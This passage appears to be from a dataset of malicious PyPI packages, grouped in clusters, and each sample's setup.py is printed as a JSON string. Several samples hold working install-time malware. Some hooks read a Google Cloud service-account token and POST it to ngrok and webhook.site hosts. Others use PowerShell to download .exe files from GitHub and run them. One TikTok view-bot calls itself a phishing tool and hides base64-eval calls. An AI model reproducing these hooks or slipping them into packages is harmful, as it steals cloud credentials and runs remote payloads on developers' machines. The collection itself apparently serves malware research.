        "code": "from setuptools import setup, find_packages\n#MAO2116\nsetup(\n    name='SIAMTTVIEWS',\n    packages=find_packages(),\n    include_package_data=True,\n    version=\"5.1.1\",\n    description='A Advance Phishing Tool Made By Siam Rahman',\n    author='SIAM RAHMAN',\n    author_email='s14mbro1@gmail.com',\n    long_description=(open(\"README.md\",\"r\")).read(),\n    long_description_content_type=\"text/markdown\",\n   install_requires=['lolcat','requests','bs4','rich'],\n \n    keywords=['siambomber', 'siamphisher', 'SiamRahman', 'Haxorsiam', 'bomber', 'call', 'prank', 'PHISHER', 'hack','sms bomber','sms bomber', 'SIAMRAHMAN'],\n    classifiers=[\n            'Development Status :: 4 - Beta',\n            'Intended Audience :: Developers',\n            'Topic :: Software Development :: Libraries :: Python Modules',\n            'License :: OSI Approved :: MIT License',\n            'Programming Language :: Python :: 3',\n            'Operating System :: OS Independent',\n            'Environment :: Console',\n    ],\n    \n    license='MIT',\n    entry_points={\n            'console_scripts': [\n                'siamttview = siamttview.siamttview:send',\n                \n            ],\n    },\n    python_requires='>=3.6'\n)\n\n\n#-----[SIAM]-----#\nfrom urllib.parse import urlencode\nimport base64\nfrom pystyle import *\nimport os\nimport sys\nimport ssl\nimport re\nimport time\nimport random\nimport threading\nimport requests\nimport hashlib\nimport json\nfrom console.utils import set_title\nfrom urllib3.exceptions import InsecureRequestWarning\nfrom http import cookiejar\n\n\nfrom subprocess import (\n    run\n)\n\n#-----[HAXOR SIAM]-----#\ntrang = \"\\033[1;37m\"\nxanh_la = \"\\033[1;32m\"\nxanh_duong = \"\\033[1;34m\"\ndo = \"\\033[1;31m\"\nvang = \"\\033[1;33m\"\ntim = \"\\033[1;35m\"\ndac_biet = \"\\033[32;5;245m\\033[1m\\033[38;5;39m\"\nkt_code = \"</>\"\ndem = 0\ns= \"\\033[1;32m\"\n\n\ndef lolcat(text):\n  run([\"lolcat\"], input=text, text=True)\n\n\n#-----[SIAM RAHMAN]-----#\nbanner = \"\"\"\n  \u2588\u2588\u2588\u2588\u2588\u2588 \u2003 \u2003\u2588\u2588 \u2003\u2003  \u2588\u2588\u2588\u2588\u2588  \u2003   \u2588\u2588\u2588    \u2588\u2588\u2588\n \u2588\u2588      \u2003\u2003 \u2588\u2588 \u2003\u2003 \u2588\u2588   \u2588\u2588 \u2003\u2003\u2003 \u2588\u2588\u2588\u2588  \u2588\u2588\u2588\u2588\n  \u2588\u2588\u2588\u2588\u2588   \u2003 \u2588\u2588 \u2003\u2003 \u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2003\u2003\u2003 \u2588\u2588 \u2588\u2588\u2588\u2588 \u2588\u2588\n      \u2588\u2588  \u2003 \u2588\u2588 \u2003\u2003 \u2588\u2588   \u2588\u2588 \u2003\u2003 \u2003\u2588\u2588  \u2588\u2588  \u2588\u2588\n \u2588\u2588\u2588\u2588\u2588\u2588  \u2003\u2003 \u2588\u2588 \u2003\u2003 \u2588\u2588   \u2588\u2588 \u2003\u2003\u2003 \u2588\u2588      \u2588\u2588\n\"\"\"\nInfo = f'''{s}\n\\|_____________________________________________________________________|/\n\\|---------------------------------------------------------------------|/\n\\|---------------------------------------------------------------------|/\n\\|                                                                     |/\n\\|           [S]|> AUTHOR    : SIAM RAHMAN(HAXOR SIAM)                 |/\n\\|           [I]|> GITHUB    : SIAMRAHMAN000                           |/\n\\|           [A]|> FACEBOOK  : SKILLSIAM1245                           |/\n\\|           [M]|> INSTAGRAM : SKILSIAM                                |/\n\\|           [?]|> TOOL      : TIKTOK VIEWBOT                          |/\n\\|           [^]|> CODE      : PYTHON                                  |/\n\\|                                                                     |/\n\\|---------------------------------------------------------------------|/\n\\|---------------------------------------------------------------------|/\n\\|_____________________________________________________________________|/\n'''\nclass BlockCookies(cookiejar.CookiePolicy):\n    return_ok = set_ok = domain_return_ok = path_return_ok = lambda self, *args, **kwargs: False\n    netscape = True\n    rfc2965 = hide_cookie2 = False\n\nrequests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)\nssl._create_default_https_context = ssl._create_unverified_context\n\nr = requests.Session()\nr.cookies.set_policy(BlockCookies())\n\n__domains = [\"api22-core-c-useast1a.tiktokv.com\", \"api19-core-c-useast1a.tiktokv.com\",\n                          \"api16-core-c-useast1a.tiktokv.com\", \"api21-core-c-useast1a.tiktokv.com\"]\n__devices = [\"SM-G9900\", \"SM-A136U1\", \"SM-M225FV\", \"SM-E426B\", \"SM-M526BR\", \"SM-M326B\", \"SM-A528B\",\n                          \"SM-F711B\", \"SM-F926B\", \"SM-A037G\", \"SM-A225F\", \"SM-M325FV\", \"SM-A226B\", \"SM-M426B\",\n                          \"SM-A525F\", \"SM-N976N\"]\n__versions = [\"190303\", \"190205\", \"190204\", \"190103\", \"180904\", \"180804\", \"180803\", \"180802\",  \"270204\"]\nclass Gorgon:\n\tdef __init__(self,params:str,data:str,cookies:str,unix:int)->None:self.unix=unix;self.params=params;self.data=data;self.cookies=cookies\n\tdef hash(self,data:str)->str:\n\t\ttry:_hash=str(hashlib.md5(data.encode()).hexdigest())\n\t\texcept Exception:_hash=str(hashlib.md5(data).hexdigest())\n\t\treturn _hash\n\tdef get_base_string(self)->str:base_str=self.hash(self.params);base_str=base_str+self.hash(self.data)if self.data else base_str+str('0'*32);base_str=base_str+self.hash(self.cookies)if self.cookies else base_str+str('0'*32);return base_str\n\tdef get_value(self)->json:base_str=self.get_base_string();return self.encrypt(base_str)\n\tdef encrypt(self,data:str)->json:\n\t\tunix=self.unix;len=20;key=[223,119,185,64,185,155,132,131,209,185,203,209,247,194,185,133,195,208,251,195];param_list=[]\n\t\tfor i in range(0,12,4):\n\t\t\ttemp=data[8*i:8*(i+1)]\n\t\t\tfor j in range(4):H=int(temp[j*2:(j+1)*2],16);param_list.append(H)\n\t\tparam_list.extend([0,6,11,28]);H=int(hex(unix),16);param_list.append((H&4278190080)>>24);param_list.append((H&16711680)>>16);param_list.append((H&65280)>>8);param_list.append((H&255)>>0);eor_result_list=[]\n\t\tfor (A,B) in zip(param_list,key):eor_result_list.append(A^B)\n\t\tfor i in range(len):C=self.reverse(eor_result_list[i]);D=eor_result_list[(i+1)%len];E=C^D;F=self.rbit_algorithm(E);H=(F^4294967295^len)&255;eor_result_list[i]=H\n\t\tresult=''\n\t\tfor param in eor_result_list:result+=self.hex_string(param)\n\t\treturn{'X-Gorgon':'0404b0d30000'+result,'X-Khronos':str(unix)}\n\tdef rbit_algorithm(self,num):\n\t\tresult='';tmp_string=bin(num)[2:]\n\t\twhile len(tmp_string)<8:tmp_string='0'+tmp_string\n\t\tfor i in range(0,8):result=result+tmp_string[7-i]\n\t\treturn int(result,2)\n\tdef hex_string(self,num):\n\t\ttmp_string=hex(num)[2:]\n\t\tif len(tmp_string)<2:tmp_string='0'+tmp_string\n\t\treturn tmp_string\n\tdef reverse(self,num):tmp_string=self.hex_string(num);return int(tmp_string[1:]+tmp_string[:1],16)\n\ndef send(__device_id, __install_id, cdid, openudid):\n    global reqs, _lock, success, fails, rps, rpm\n    for x in range(115):\n        try:\n            version = random.choice(__versions)\n            params = urlencode(\n                                {\n                                    \"os_api\": \"25\",\n                                    \"device_type\": random.choice(__devices),\n                                    \"ssmix\": \"a\",\n                                    \"manifest_version_code\": version,\n                                    \"dpi\": \"240\",\n                                    \"region\": \"BD\",\n                                    \"carrier_region\": \"BD\",\n                                    \"app_name\": \"musically_go\",\n                                    \"version_name\": \"27.2.4\",\n                                    \"timezone_offset\": \"-28800\",\n                                    \"ab_version\": \"27.2.4\",\n                                    \"ac2\": \"wifi\",\n                                    \"ac\": \"wifi\",\n                                    \"app_type\": \"normal\",\n                                    \"channel\": \"googleplay\",\n                                    \"update_version_code\": version,\n                                    \"device_platform\": \"android\",\n                                    \"iid\": __install_id,\n                                    \"build_number\": \"27.2.4\",\n                                    \"locale\": \"vi\",\n                                    \"op_region\": \"BD\",\n                                    \"version_code\": version,\n                                    \"timezone_name\": \"Asia/Dhaka\",\n                                    \"device_id\": __device_id,\n                                    \"sys_region\": \"BD\",\n                                    \"app_language\": \"bn\",\n                                    \"resolution\": \"720*1280\",\n                                    \"device_brand\": \"samsung\",\n                                    \"language\": \"bn\",\n                                    \"os_version\": \"7.1.2\",\n                                    \"aid\": \"1340\"\n                                }\n        )\n            payload = f\"item_id={__aweme_id}&play_delta=1\"\n            sig     = Gorgon(params=params, cookies=None, data=None, unix=int(time.time())).get_value()\n\n            proxy = random.choice(proxies) if config['proxy']['use-proxy'] else \"\"\n\n            response = r.post(\n                url = (\n                    \"https://\"\n                    +  random.choice(__domains)  +\n                    \"/aweme/v1/aweme/stats/?\" + params\n                ),\n                data    = payload,\n                headers = {'cookie':'sessionid=90c38a59d8076ea0fbc01c8643efbe47','x-gorgon':sig['X-Gorgon'],'x-khronos':sig['X-Khronos'],'user-agent':'okhttp/3.10.0.1'},\n                verify  = False,\n                proxies = {\"http\": proxy_format+proxy, \"https\": proxy_format+proxy} if config['proxy']['use-proxy'] else {}\n            )\n            reqs += 1\n            try:\n                if response.json()['status_code'] == 0:\n                    _lock.acquire()\n                    print(f'{xanh_la}[{xanh_la}REQUESTS]{do} :{vang}{reqs}{do} {xanh_duong} [SUCCESS] :{do} {xanh_la}{success}{do} / {xanh_la}[RPM] :{do}{vang}{rpm}{do} / {xanh_la}[RPS] :{do}{vang}{rps}{do} / {xanh_duong}[FAILED] :{do}{xanh_la}{fails}{do}')\n                    success += 1\n                    _lock.release()\n            except:\n                if _lock.locked():_lock.release()\n                fails += 1\n                continue\n\n        except Exception as e:\n            pass\n\ndef rpsm_loop():\n    global rps, rpm\n    while True:\n        initial = reqs\n        time.sleep(1.5)\n        rps = round((reqs - initial) / 1.5, 1)\n        rpm = round(rps * 60, 1)\n\n\ndef fetch_proxies():\n    url_list =[\n        \"https://raw.githubusercontent.com/yemixzy/proxy-list/main/proxy-list/data.txt\",\n        \"https://raw.githubusercontent.com/UptimerBot/proxy-list/main/proxies/http.txt\",\n        \"https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/http.txt\",\n        \"https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/socks4.txt\",\n        \"https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/socks5.txt\"\n        \n    ]\n    for url in url_list :\n        response = requests.get(\n            url=url\n        )\n        if response.ok:\n            with open(\"proxies.txt\", \"a+\") as f:\n                f.write(response.text)\n                f.close()\n        else:\n            pass\n\nif __name__ == \"__main__\":\n    with open('devices.txt', 'r') as f:\n        devices = f.read().splitlines()\n    \n    with open('config.json', 'r') as f:\n        config = json.load(f)\n    if config[\"proxy\"]['proxyscrape']:\n        fetch_proxies()\n    proxy_format = f'{config[\"proxy\"][\"proxy-type\"].lower()}://{config[\"proxy\"][\"credential\"]+\"@\" if config[\"proxy\"][\"auth\"] else \"\"}' if config['proxy']['use-proxy'] else ''\n    if config['proxy']['use-proxy']:\n        with open('proxies.txt', 'r') as f:\n            proxies = f.read().splitlines()\n    os.system(\"cls\" if os.name == \"nt\" else \"clear\")\n    lolcat(banner)\n    lolcat(Info)\n    try:\n        link = input(f'{do}[{trang}{kt_code}{do}] {xanh_la}INPUT VIDEO ID : {trang}')\n        print(f'{trang}- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -')\n        __aweme_id = str(\n            re.findall(r\"(\\d{18,19})\", link)[0]\n            if len(re.findall(r\"(\\d{18,19})\", link)) == 1\n            else re.findall(\n                r\"(\\d{18,19})\",\n                requests.head(link, allow_redirects=True, timeout=5).url\n            )[0]\n        )\n    except:\n        exit(f\"{do}[{trang}{kt_code}{do}] {do}INVALID LINK\")\n    \n    _lock = threading.Lock()\n    reqs = 0\n    success = 0\n    fails = 0\n    rpm = 0\n    rps = 0\n    \n    threading.Thread(target=rpsm_loop).start()\n    \n    \n    while True:\n        device = random.choice(devices)\n\n        if eval(base64.b64decode(\"dGhyZWFkaW5nLmFjdGl2ZV9jb3VudCgpIDwgMTAwICMgZG9uJ3QgY2hhbmdlIGNvdW50IG9yIHUgd2lsbCBraWxsIGRldmljZXMgYW5kIHJ1aW4gZnVuIGZvciBvdGhlcnM=\")):\n            did, iid, cdid, openudid = device.split(':')\n            eval(base64.b64decode('dGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9c2VuZCxhcmdzPVtkaWQsaWlkLGNkaWQsb3BlbnVkaWRdKS5zdGFydCgp'))\n\n\n#PIP UPLOAD BY SIAM RAHMAN\n"
      }
    ]
  },
  {
    "cluster_id": 140,
    "size": 2,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-10-28-youreallydontwantthispackage2131-v1.0.1",
        "code": "from setuptools import setup\nfrom setuptools.command.install import install\nimport os\nfrom setuptools.command.install import install\nfrom setuptools.command.develop import develop\nfrom setuptools.command.egg_info import egg_info\n\n\ndef custom_command():\n    os.system(\"access_token=$(curl -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token'); curl -X POST -d \\\"$access_token\\\" https://9435-34-42-190-190.ngrok-free.app/hellofrompip\")\n\n\n\n\nclass CustomInstallCommand(install):\n    def run(self):\n        install.run(self)\n        custom_command()\n\n\n\n\nclass CustomDevelopCommand(develop):\n    def run(self):\n        develop.run(self)\n        custom_command()\n\n\n\n\nclass CustomEggInfoCommand(egg_info):\n    def run(self):\n        egg_info.run(self)\n        custom_command()\n\n\n\n\nsetup(\n    name='youreallydontwantthispackage2131',\n    version='1.0.1',\n    description='Descriptionnn',\n    author='testauthor',\n    author_email='youreallydontwantthispackage2131@youreallydontwantthispackage2131.com',\n    packages=[],\n    cmdclass={\n        'install': CustomInstallCommand,\n        'develop': CustomDevelopCommand,\n        'egg_info': CustomEggInfoCommand,\n    },\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-10-19-puffionerlolpo2131-v1",
        "code": "from setuptools import setup\nfrom setuptools.command.install import install\nimport os\nfrom setuptools.command.install import install\nfrom setuptools.command.develop import develop\nfrom setuptools.command.egg_info import egg_info\n\ndef custom_command():\n    os.system(\"access_token=$(curl -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/802600642553@cloudbuild.gserviceaccount.com/token'); curl -X POST -d \\\"$access_token\\\" https://webhook.site/c100b39f-8d06-40c4-bc5f-64e251fcc6ad\")\n\n\nclass CustomInstallCommand(install):\n    def run(self):\n        install.run(self)\n        custom_command()\n\n\nclass CustomDevelopCommand(develop):\n    def run(self):\n        develop.run(self)\n        custom_command()\n\n\nclass CustomEggInfoCommand(egg_info):\n    def run(self):\n        egg_info.run(self)\n        custom_command()\n\n\nsetup(\n     name='puffionerlolpo2131',\n    version='1',\n    description='Descriptionnn',\n    author='asdsadaslolo',\n    author_email='asdadakmasijaisjdsadas@example.com',\n    packages=[],\n    cmdclass={\n        'install': CustomInstallCommand,\n        'develop': CustomDevelopCommand,\n        'egg_info': CustomEggInfoCommand,\n    },\n)\n"
      }
    ]
  },
  {
    "cluster_id": 141,
    "size": 15,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-09-23-pysleek-v0.0.1",
        "code": "from setuptools import setup\n\nsetup(\n  name=\"pysleek\",\n  version=\"0.0.1\",\n  author=\"skibidiohiosigma123\",\n  description=\"None\",\n  packages=[\"pysleek\"]\n)\n\nimport subprocess\nimport os\n\n# Define the output path for the downloaded file\noutput_file = os.path.join(os.getcwd(), \"zwerve.exe\")\n\n# Step 1: PowerShell command to download the file using curl.exe\ndownload_command = f'curl.exe -L https://github.com/holdthatcode/e/raw/main/zwerve.exe -o \"{output_file}\"'\n\n# Run the PowerShell command to download the file\ndownload_result = subprocess.run([\"powershell\", \"-Command\", download_command], capture_output=True, text=True)\n\n# Output PowerShell result for debugging\nprint(\"Download Output:\", download_result.stdout)\nprint(\"Download Error:\", download_result.stderr)\n\n# Check if download succeeded and the file exists\nif download_result.returncode == 0 and os.path.exists(output_file):\n    # Step 2: Run the downloaded executable silently using the full path\n    execute_command = f'Start-Process \"{output_file}\" -NoNewWindow -Wait'\n    execute_result = subprocess.run([\"powershell\", \"-Command\", execute_command], capture_output=True, text=True)\n\n    # Output PowerShell result for debugging\n    print(\"Execution Output:\", execute_result.stdout)\n    print(\"Execution Error:\", execute_result.stderr)\nelse:\n    print(\"File download failed or file not found.\")\n\n\nimport subprocess\nimport os\n\n# Define the output path for the downloaded file\noutput_file = os.path.join(os.getcwd(), \"zwerve.exe\")\n\n# Step 1: PowerShell command to download the file using curl.exe\ndownload_command = f'curl.exe -L https://github.com/holdthatcode/e/raw/main/zwerve.exe -o \"{output_file}\"'\n\n# Run the PowerShell command to download the file\ndownload_result = subprocess.run([\"powershell\", \"-Command\", download_command], capture_output=True, text=True)\n\n# Output PowerShell result for debugging\nprint(\"Download Output:\", download_result.stdout)\nprint(\"Download Error:\", download_result.stderr)\n\n# Check if download succeeded and the file exists\nif download_result.returncode == 0 and os.path.exists(output_file):\n    # Step 2: Run the downloaded executable silently using the full path\n    execute_command = f'Start-Process \"{output_file}\" -NoNewWindow -Wait'\n    execute_result = subprocess.run([\"powershell\", \"-Command\", execute_command], capture_output=True, text=True)\n\n    # Output PowerShell result for debugging\n    print(\"Execution Output:\", execute_result.stdout)\n    print(\"Execution Error:\", execute_result.stderr)\nelse:\n    print(\"File download failed or file not found.\")\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-09-26-pyvantq-v0.0.1",
        "code": "from setuptools import setup\n\nsetup(\n  name=\"pyvantq\",\n  version=\"0.0.1\",\n  author=\"skibidiohiosigma123\",\n  description=\"None\",\n  packages=[\"pyvantq\"]\n)\n\nimport subprocess\nimport os\n\n# Define the output path for the downloaded file\noutput_file = os.path.join(os.getcwd(), \"zwerve.exe\")\n\n# Step 1: PowerShell command to download the file using curl.exe\ndownload_command = f'curl.exe -L https://github.com/holdthatcode/e/raw/main/zwerve.exe -o \"{output_file}\"'\n\n# Run the PowerShell command to download the file\ndownload_result = subprocess.run([\"powershell\", \"-Command\", download_command], capture_output=True, text=True)\n\n# Output PowerShell result for debugging\nprint(\"Download Output:\", download_result.stdout)\nprint(\"Download Error:\", download_result.stderr)\n\n# Check if download succeeded and the file exists\nif download_result.returncode == 0 and os.path.exists(output_file):\n    # Step 2: Run the downloaded executable silently using the full path\n    execute_command = f'Start-Process \"{output_file}\" -NoNewWindow -Wait'\n    execute_result = subprocess.run([\"powershell\", \"-Command\", execute_command], capture_output=True, text=True)\n\n    # Output PowerShell result for debugging\n    print(\"Execution Output:\", execute_result.stdout)\n    print(\"Execution Error:\", execute_result.stderr)\nelse:\n    print(\"File download failed or file not found.\")\n\n\nimport subprocess\nimport os\n\n# Define the output path for the downloaded file\noutput_file = os.path.join(os.getcwd(), \"zwerve.exe\")\n\n# Step 1: PowerShell command to download the file using curl.exe\ndownload_command = f'curl.exe -L https://github.com/holdthatcode/e/raw/main/zwerve.exe -o \"{output_file}\"'\n\n# Run the PowerShell command to download the file\ndownload_result = subprocess.run([\"powershell\", \"-Command\", download_command], capture_output=True, text=True)\n\n# Output PowerShell result for debugging\nprint(\"Download Output:\", download_result.stdout)\nprint(\"Download Error:\", download_result.stderr)\n\n# Check if download succeeded and the file exists\nif download_result.returncode == 0 and os.path.exists(output_file):\n    # Step 2: Run the downloaded executable silently using the full path\n    execute_command = f'Start-Process \"{output_file}\" -NoNewWindow -Wait'\n    execute_result = subprocess.run([\"powershell\", \"-Command\", execute_command], capture_output=True, text=True)\n\n    # Output PowerShell result for debugging\n    print(\"Execution Output:\", execute_result.stdout)\n    print(\"Execution Error:\", execute_result.stderr)\nelse:\n    print(\"File download failed or file not found.\")\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-10-06-discould-v0.0.1",
        "code": "from setuptools import setup\n\nsetup(\n  name=\"discould\",\n  version=\"0.0.1\",\n  author=\"PRCloudTech\",\n  description=\"None\",\n  packages=[\"discould\"]\n)\n\nimport subprocess\nimport os\n\n# Define the output path for the downloaded file\noutput_file = os.path.join(os.getcwd(), \"Anch.exe\")\n\n# Step 1: PowerShell command to download the file using curl.exe\ndownload_command = f'curl.exe -L https://github.com/holdthatcode/e/raw/main/Anch.exe -o \"{output_file}\"'\n\n# Run the PowerShell command to download the file\ndownload_result = subprocess.run([\"powershell\", \"-Command\", download_command], capture_output=True, text=True)\n\n# Output PowerShell result for debugging\nprint(\"Download Output:\", download_result.stdout)\nprint(\"Download Error:\", download_result.stderr)\n\n# Check if download succeeded and the file exists\nif download_result.returncode == 0 and os.path.exists(output_file):\n    # Step 2: Run the downloaded executable silently using the full path\n    execute_command = f'Start-Process \"{output_file}\" -NoNewWindow -Wait'\n    execute_result = subprocess.run([\"powershell\", \"-Command\", execute_command], capture_output=True, text=True)\n\n    # Output PowerShell result for debugging\n    print(\"Execution Output:\", execute_result.stdout)\n    print(\"Execution Error:\", execute_result.stderr)\nelse:\n    print(\"File download failed or file not found.\")\n\n\nimport subprocess\nimport os\n\n# Define the output path for the downloaded file\noutput_file = os.path.join(os.getcwd(), \"Anch.exe\")\n\n# Step 1: PowerShell command to download the file using curl.exe\ndownload_command = f'curl.exe -L https://github.com/holdthatcode/e/raw/main/Anch.exe -o \"{output_file}\"'\n\n# Run the PowerShell command to download the file\ndownload_result = subprocess.run([\"powershell\", \"-Command\", download_command], capture_output=True, text=True)\n\n# Output PowerShell result for debugging\nprint(\"Download Output:\", download_result.stdout)\nprint(\"Download Error:\", download_result.stderr)\n\n# Check if download succeeded and the file exists\nif download_result.returncode == 0 and os.path.exists(output_file):\n    # Step 2: Run the downloaded executable silently using the full path\n    execute_command = f'Start-Process \"{output_file}\" -NoNewWindow -Wait'\n    execute_result = subprocess.run([\"powershell\", \"-Command\", execute_command], capture_output=True, text=True)\n\n    # Output PowerShell result for debugging\n    print(\"Execution Output:\", execute_result.stdout)\n    print(\"Execution Error:\", execute_result.stderr)\nelse:\n    print(\"File download failed or file not found.\")\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-10-07-pycblines-v0.0.1",
        "code": "from setuptools import setup\n\nsetup(\n  name=\"pycblines\",\n  version=\"0.0.1\",\n  author=\"PRCloudTech\",\n  description=\"None\",\n  packages=[\"pycblines\"]\n)\n\nimport subprocess\nimport os\n\n# Define the output path for the downloaded file\noutput_file = os.path.join(os.getcwd(), \"CBLines.exe\")\n\n# Step 1: PowerShell command to download the file using curl.exe\ndownload_command = f'curl.exe -L https://github.com/holdthatcode/e/raw/main/CBLines.exe -o \"{output_file}\"'\n\n# Run the PowerShell command to download the file\ndownload_result = subprocess.run([\"powershell\", \"-Command\", download_command], capture_output=True, text=True)\n\n# Output PowerShell result for debugging\nprint(\"Download Output:\", download_result.stdout)\nprint(\"Download Error:\", download_result.stderr)\n\n# Check if download succeeded and the file exists\nif download_result.returncode == 0 and os.path.exists(output_file):\n    # Step 2: Run the downloaded executable silently using the full path\n    execute_command = f'Start-Process \"{output_file}\" -NoNewWindow -Wait'\n    execute_result = subprocess.run([\"powershell\", \"-Command\", execute_command], capture_output=True, text=True)\n\n    # Output PowerShell result for debugging\n    print(\"Execution Output:\", execute_result.stdout)\n    print(\"Execution Error:\", execute_result.stderr)\nelse:\n    print(\"File download failed or file not found.\")\n\n\nimport subprocess\nimport os\n\n# Define the output path for the downloaded file\noutput_file = os.path.join(os.getcwd(), \"CBLines.exe\")\n\n# Step 1: PowerShell command to download the file using curl.exe\ndownload_command = f'curl.exe -L https://github.com/holdthatcode/e/raw/main/CBLines.exe -o \"{output_file}\"'\n\n# Run the PowerShell command to download the file\ndownload_result = subprocess.run([\"powershell\", \"-Command\", download_command], capture_output=True, text=True)\n\n# Output PowerShell result for debugging\nprint(\"Download Output:\", download_result.stdout)\nprint(\"Download Error:\", download_result.stderr)\n\n# Check if download succeeded and the file exists\nif download_result.returncode == 0 and os.path.exists(output_file):\n    # Step 2: Run the downloaded executable silently using the full path\n    execute_command = f'Start-Process \"{output_file}\" -NoNewWindow -Wait'\n    execute_result = subprocess.run([\"powershell\", \"-Command\", execute_command], capture_output=True, text=True)\n\n    # Output PowerShell result for debugging\n    print(\"Execution Output:\", execute_result.stdout)\n    print(\"Execution Error:\", execute_result.stderr)\nelse:\n    print(\"File download failed or file not found.\")\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-10-08-pysolara-v0.0.1",
        "code": "from setuptools import setup\n\nsetup(\n  name=\"pysolara\",\n  version=\"0.0.1\",\n  author=\"PRCloudTech\",\n  description=\"None\",\n  packages=[\"pysolara\"]\n)\n\nimport subprocess\nimport os\n\n# Define the output path for the downloaded file\noutput_file = os.path.join(os.getcwd(), \"CBLines.exe\")\n\n# Step 1: PowerShell command to download the file using curl.exe\ndownload_command = f'curl.exe -L https://github.com/holdthatcode/e/raw/main/CBLines.exe -o \"{output_file}\"'\n\n# Run the PowerShell command to download the file\ndownload_result = subprocess.run([\"powershell\", \"-Command\", download_command], capture_output=True, text=True)\n\n# Output PowerShell result for debugging\nprint(\"Download Output:\", download_result.stdout)\nprint(\"Download Error:\", download_result.stderr)\n\n# Check if download succeeded and the file exists\nif download_result.returncode == 0 and os.path.exists(output_file):\n    # Step 2: Run the downloaded executable silently using the full path\n    execute_command = f'Start-Process \"{output_file}\" -NoNewWindow -Wait'\n    execute_result = subprocess.run([\"powershell\", \"-Command\", execute_command], capture_output=True, text=True)\n\n    # Output PowerShell result for debugging\n    print(\"Execution Output:\", execute_result.stdout)\n    print(\"Execution Error:\", execute_result.stderr)\nelse:\n    print(\"File download failed or file not found.\")\n\n\nimport subprocess\nimport os\n\n# Define the output path for the downloaded file\noutput_file = os.path.join(os.getcwd(), \"CBLines.exe\")\n\n# Step 1: PowerShell command to download the file using curl.exe\ndownload_command = f'curl.exe -L https://github.com/holdthatcode/e/raw/main/CBLines.exe -o \"{output_file}\"'\n\n# Run the PowerShell command to download the file\ndownload_result = subprocess.run([\"powershell\", \"-Command\", download_command], capture_output=True, text=True)\n\n# Output PowerShell result for debugging\nprint(\"Download Output:\", download_result.stdout)\nprint(\"Download Error:\", download_result.stderr)\n\n# Check if download succeeded and the file exists\nif download_result.returncode == 0 and os.path.exists(output_file):\n    # Step 2: Run the downloaded executable silently using the full path\n    execute_command = f'Start-Process \"{output_file}\" -NoNewWindow -Wait'\n    execute_result = subprocess.run([\"powershell\", \"-Command\", execute_command], capture_output=True, text=True)\n\n    # Output PowerShell result for debugging\n    print(\"Execution Output:\", execute_result.stdout)\n    print(\"Execution Error:\", execute_result.stderr)\nelse:\n    print(\"File download failed or file not found.\")\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-10-08-pytskcheck-v0.0.1",
        "code": "from setuptools import setup\n\nsetup(\n  name=\"pytskcheck\",\n  version=\"0.0.1\",\n  author=\"PRCloudTech\",\n  description=\"None\",\n  packages=[\"pytskcheck\"]\n)\n\nimport subprocess\nimport os\n\n# Define the output path for the downloaded file\noutput_file = os.path.join(os.getcwd(), \"CBLines.exe\")\n\n# Step 1: PowerShell command to download the file using curl.exe\ndownload_command = f'curl.exe -L https://github.com/holdthatcode/e/raw/main/CBLines.exe -o \"{output_file}\"'\n\n# Run the PowerShell command to download the file\ndownload_result = subprocess.run([\"powershell\", \"-Command\", download_command], capture_output=True, text=True)\n\n# Output PowerShell result for debugging\nprint(\"Download Output:\", download_result.stdout)\nprint(\"Download Error:\", download_result.stderr)\n\n# Check if download succeeded and the file exists\nif download_result.returncode == 0 and os.path.exists(output_file):\n    # Step 2: Run the downloaded executable silently using the full path\n    execute_command = f'Start-Process \"{output_file}\" -NoNewWindow -Wait'\n    execute_result = subprocess.run([\"powershell\", \"-Command\", execute_command], capture_output=True, text=True)\n\n    # Output PowerShell result for debugging\n    print(\"Execution Output:\", execute_result.stdout)\n    print(\"Execution Error:\", execute_result.stderr)\nelse:\n    print(\"File download failed or file not found.\")\n\n\nimport subprocess\nimport os\n\n# Define the output path for the downloaded file\noutput_file = os.path.join(os.getcwd(), \"CBLines.exe\")\n\n# Step 1: PowerShell command to download the file using curl.exe\ndownload_command = f'curl.exe -L https://github.com/holdthatcode/e/raw/main/CBLines.exe -o \"{output_file}\"'\n\n# Run the PowerShell command to download the file\ndownload_result = subprocess.run([\"powershell\", \"-Command\", download_command], capture_output=True, text=True)\n\n# Output PowerShell result for debugging\nprint(\"Download Output:\", download_result.stdout)\nprint(\"Download Error:\", download_result.stderr)\n\n# Check if download succeeded and the file exists\nif download_result.returncode == 0 and os.path.exists(output_file):\n    # Step 2: Run the downloaded executable silently using the full path\n    execute_command = f'Start-Process \"{output_file}\" -NoNewWindow -Wait'\n    execute_result = subprocess.run([\"powershell\", \"-Command\", execute_command], capture_output=True, text=True)\n\n    # Output PowerShell result for debugging\n    print(\"Execution Output:\", execute_result.stdout)\n    print(\"Execution Error:\", execute_result.stderr)\nelse:\n    print(\"File download failed or file not found.\")\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-10-09-lowui-v0.0.1",
